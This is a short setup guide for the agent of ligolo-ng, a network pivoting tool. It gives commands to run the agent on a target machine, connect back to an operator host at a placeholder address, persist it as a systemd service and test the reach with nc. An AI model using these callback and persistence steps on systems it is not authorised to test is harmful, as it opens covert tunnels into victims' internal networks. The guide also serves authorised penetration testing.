# ligolo-ng Agent Setup (Target / Pivot Machine)

## Prerequisites

- A ligolo-ng `agent` binary uploaded to the target
- Outbound connectivity from the target to the operator machine on port 11601

## Deploy Agent

### Linux

```bash
# Download (or transfer) the agent binary
chmod +x agent

# Connect to operator proxy (self-signed cert)
./agent -connect <OPERATOR_IP>:11601 -ignore-cert

# Connect with TLS certificate verification
./agent -connect <OPERATOR_IP>:11601 -ca ca.crt
```

### Windows

```powershell
.\agent.exe -connect <OPERATOR_IP>:11601 -ignore-cert
```

### As a background service (Linux systemd)

```ini
# /etc/systemd/system/ligolo-agent.service
[Unit]
Description=ligolo-ng agent

[Service]
ExecStart=/usr/local/bin/agent -connect operator.example.com:11601 -ignore-cert
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now ligolo-agent
```

## Firewall Considerations

Ensure outbound TCP/UDP on the configured port (default 11601) is allowed from the target to the operator.

```bash
# Check connectivity
nc -zv <OPERATOR_IP> 11601
```
